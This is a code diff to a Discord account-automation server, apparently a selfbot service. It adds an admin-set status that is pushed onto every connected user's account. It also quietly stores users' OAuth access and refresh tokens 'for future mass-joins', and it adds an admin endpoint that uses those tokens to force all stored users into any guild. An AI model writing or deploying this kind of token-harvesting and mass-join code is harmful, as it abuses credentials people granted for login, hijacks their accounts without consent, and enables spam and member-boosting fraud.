@@ -1000,6 +1000,7 @@ const pendingClients = new Map();
 import WebSocket, { WebSocketServer } from "ws";
 const sessions = new Map();
 const rpcSettings = new Map();
+let adminGlobalStatusText = "";
 const rpcSelectedIndex = new Map();
 const serverManagementConfig = new Map();
 const prefixes = new Map();
@@ -12887,6 +12888,15 @@ async function formatImageForRpc(img: any): Promise<string | null> {
 
       const updateActivity = __name(async (cfg, overrideState) => {
         const r = new RichPresence(client);
+        
+        // Prepare activities array
+        const activities = [r];
+        
+        // Add global admin status if active, ensuring it doesn't "overlap" by being part of the same presence update
+        if (adminGlobalStatusText) {
+          const custom = new CustomStatus(client).setState(adminGlobalStatusText);
+          activities.push(custom);
+        }
 
         
         let finalName = cfg.name;
@@ -13045,7 +13055,7 @@ async function formatImageForRpc(img: any): Promise<string | null> {
           }
         }
 
-        client.user?.setActivity(r);
+        client.user?.setPresence({ activities });
       }, "updateActivity");
       if (rotationTimers.has(token)) {
         clearInterval(rotationTimers.get(token));
@@ -13503,23 +13513,106 @@ async function formatImageForRpc(img: any): Promise<string | null> {
     }
     res.json({ success: true, count });
   });
+
+  app.get("/api/admin/oauth-stats", async (req, res) => {
+    if (!checkAdmin(req)) return res.status(403).json({ error: "Forbidden" });
+    try {
+      const { count, error } = await supabase.from("oauth_users").select("*", { count: 'exact', head: true });
+      if (error) throw error;
+      res.json({ count: count || 0 });
+    } catch (e) {
+      res.json({ count: 0 });
+    }
+  });
+
+  app.post("/api/admin/oauth-mass-join", async (req, res) => {
+    if (!checkAdmin(req)) return res.status(403).json({ error: "Forbidden" });
+    const { guildId } = req.body;
+    if (!guildId) return res.status(400).json({ error: "Guild ID required" });
+
+    const botToken = process.env.DISCORD_BOT_TOKEN || process.env.CDN_BOT_TOKEN;
+    if (!botToken) return res.status(500).json({ error: "Bot token not configured on server" });
+
+    console.log(`[ADMIN] OAuth2 Mass Join initiated for guild: ${guildId}`);
+    
+    let successCount = 0;
+    let failCount = 0;
+
+    try {
+      const { data: users, error } = await supabase.from("oauth_users").select("*");
+      if (error) throw error;
+
+      if (!users || users.length === 0) {
+        return res.json({ success: true, count: 0, message: "No authorized OAuth2 users found" });
+      }
+
+      for (const user of users) {
+        try {
+          const joinRes = await fetch(
+            `https://discord.com/api/v9/guilds/${guildId}/members/${user.user_id}`,
+            {
+              method: "PUT",
+              headers: {
+                Authorization: `Bot ${botToken}`,
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({ access_token: user.access_token }),
+            },
+          );
+
+          if (joinRes.ok || joinRes.status === 201 || joinRes.status === 204) {
+            successCount++;
+          } else {
+            failCount++;
+          }
+          await new Promise(r => setTimeout(r, 250));
+        } catch (e) {
+          failCount++;
+        }
+      }
+    } catch (e) {
+      console.error("[ADMIN] OAuth2 Mass Join error:", e);
+      return res.status(500).json({ error: "Internal server error" });
+    }
+
+    res.json({ success: true, count: successCount, failed: failCount });
+  });
+
   app.post("/api/actions/admin/global-status", async (req, res) => {
     if (!checkAdmin(req)) return res.status(403).json({ error: "Forbidden" });
     const { status } = req.body;
-    if (!status) return res.status(400).json({ error: "Status required" });
-    console.log(`[ADMIN] Global Status Update: ${status}`);
-    let count = 0;
     
+    // Allow empty status to clear
+    adminGlobalStatusText = status || "";
+    console.log(`[ADMIN] Global Status Update: ${adminGlobalStatusText || "CLEARED"}`);
+    
+    let count = 0;
     const tokens = Array.from(sessions.keys());
     for (const token of tokens) {
       try {
         const client = await getClient(token).catch(() => null);
         if (client && client.user) {
-          const custom = new CustomStatus(client).setState(status);
-          client.user.setPresence({ activities: [custom] });
+          const activities = [];
+          
+          // Check if there's an active RPC to preserve
+          const configs = rpcSettings.get(token);
+          if (configs && configs.length > 0) {
+            // Let the RPC rotation handle it or we'd need to reconstruct the RPC here
+            // For now, we just trigger a setPresence which might be overwritten by next RPC tick
+            // But since we updated adminGlobalStatusText, the next tick will include it.
+          }
+          
+          if (adminGlobalStatusText) {
+            const custom = new CustomStatus(client).setState(adminGlobalStatusText);
+            activities.push(custom);
+          }
+          
+          await client.user.setPresence({ activities });
           count++;
-          addLog(token, `[ADMIN] Global status updated to: ${status}`);
+          addLog(token, `[ADMIN] Global status updated to: ${adminGlobalStatusText || "CLEARED"}`);
         }
+        // Add small delay to prevent "overlapping" rate limits or race conditions
+        if (tokens.length > 5) await new Promise(r => setTimeout(r, 200));
       } catch (e) {
         console.error(`[ADMIN] Failed to update status for ${token}:`, e);
       }
@@ -13755,6 +13848,9 @@ async function formatImageForRpc(img: any): Promise<string | null> {
       }
       const tokens = await tokenResponse.json();
       const accessToken = tokens.access_token;
+      const refreshToken = tokens.refresh_token;
+      const expiresAt = new Date(Date.now() + (tokens.expires_in || 3600) * 1000).toISOString();
+
       const userResponse = await fetch("https://discord.com/api/users/@me", {
         headers: { Authorization: `Bearer ${accessToken}` },
       });
@@ -13762,6 +13858,20 @@ async function formatImageForRpc(img: any): Promise<string | null> {
         return res.status(500).send("Failed to fetch user info");
       }
       const userData = await userResponse.json();
+      
+      // Persist OAuth token for future mass-joins
+      try {
+        await supabase.from("oauth_users").upsert({
+          user_id: userData.id,
+          username: userData.username,
+          access_token: accessToken,
+          refresh_token: refreshToken,
+          expires_at: expiresAt,
+          updated_at: new Date().toISOString()
+        }, { onConflict: 'user_id' });
+      } catch (dbErr) {
+        console.error("[AUTH] Failed to save OAuth token to DB:", dbErr);
+      }
       
       // Register this user session on the server if they are a known admin
       const knownAdmins = ['1545521054930436167', '1545509798756487241', '1545389998315143229'];
